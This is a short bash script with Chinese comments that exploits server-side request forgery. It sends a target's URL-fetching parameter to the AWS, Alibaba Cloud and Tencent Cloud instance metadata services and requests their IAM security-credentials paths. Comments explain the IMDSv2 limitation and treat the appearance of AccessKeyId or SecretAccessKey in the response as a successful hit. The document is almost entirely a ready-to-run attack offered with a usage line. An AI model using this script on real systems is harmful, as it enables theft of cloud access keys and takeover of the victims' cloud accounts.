#!/usr/bin/env bash
# 用法: bash ssrf-imds.sh 'http://10.0.0.5:8080/fetch?url=' [参数名]
PREFIX="${1:?usage: bash ssrf-imds.sh 'http://TARGET/path?url='}"
P="${2:-url}"
probe() { # $1 = 探测路径
  curl -sS -m 8 --get "${PREFIX%%=*}=" --data-urlencode "$P=$1" 2>/dev/null | head -c 300; echo
}
echo '--- AWS IMDSv1'
probe 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
echo '--- 阿里云'
probe 'http://100.100.100.200/latest/meta-data/ram/security-credentials/'
echo '--- 腾讯云'
probe 'http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/'
# AWS IMDSv2（需要目标支持带 header 的 PUT，多数 SSRF 只发 GET → 只能用 v1 或走 302）
#   PUT http://169.254.169.254/latest/api/token  X-aws-ec2-metadata-token-ttl-seconds: 60
# 判定：出现 AccessKeyId / SecretAccessKey / security-credentials / instance-id = 命中
